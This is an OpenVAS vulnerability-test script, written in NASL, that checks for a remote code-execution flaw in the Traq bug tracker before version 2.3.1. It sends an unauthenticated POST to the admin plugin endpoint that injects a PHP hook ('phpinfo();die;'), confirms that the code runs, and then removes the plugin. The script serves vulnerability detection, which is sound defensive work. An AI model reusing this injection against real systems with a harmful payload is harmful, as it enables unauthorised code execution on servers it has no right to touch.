###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_traq_50961.nasl 11997 2018-10-20 11:59:41Z mmartin $
#
# Traq 'authenticate()' Function Remote Code Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103359");
  script_bugtraq_id(50961);
  script_version("$Revision: 11997 $");

  script_name("Traq 'authenticate()' Function Remote Code Execution Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/50961");
  script_xref(name:"URL", value:"http://sourceforge.net/projects/qatraq/");

  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-12-08 08:05:08 +0100 (Thu, 08 Dec 2011)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_tag(name:"solution", value:"Vendor updates are available. Please see the references for details.");
  script_tag(name:"summary", value:"Traq is prone to a remote code-execution vulnerability.");
  script_tag(name:"impact", value:"An attacker can exploit this issue to execute arbitrary code with
 admin privileges. Failed exploit attempts will result in a denial-of-
 service condition.");
  script_tag(name:"affected", value:"Traq versions prior to 2.3.1 are vulnerable.");
  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!can_host_php(port:port))exit(0);

foreach dir( make_list_unique( "/traq", "/phptraq", "/bugtracker", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = dir + "/index.php";
  buf = http_get_cache( item:url, port:port );

  if("Powered by Traq" >!< buf)continue;

  host = http_host_name( port:port );
  filename = string(dir,"/admincp/plugins.php?newhook");
  ex = "plugin_id=12323&title=1&execorder=0&hook=template_footer&code=phpinfo();die;";

  req = string("POST ", filename, " HTTP/1.1\r\n",
	       "Host: ", host, "\r\n",
	       "Content-Type: application/x-www-form-urlencoded\r\n",
	       "Content-Length: ", strlen(ex),"\r\n",
	       "Connection: close\r\n",
	       "\r\n",
	       ex);
  result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

  req = string("GET ",dir,"/index.php HTTP/1.0\r\n",
	       "Host: ", host, "\r\n",
	       "Cmd: phpinfo();\r\n\r\n"
	       );
  result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

  if("<title>phpinfo()" >< result) {

    # on success remove the plugin
    url = string(dir, "/admincp/plugins.php?remove&plugin=12323");
    req = http_get(item:url, port:port);
    http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

    security_message(port:port);
    exit(0);
  }
}

exit(99);
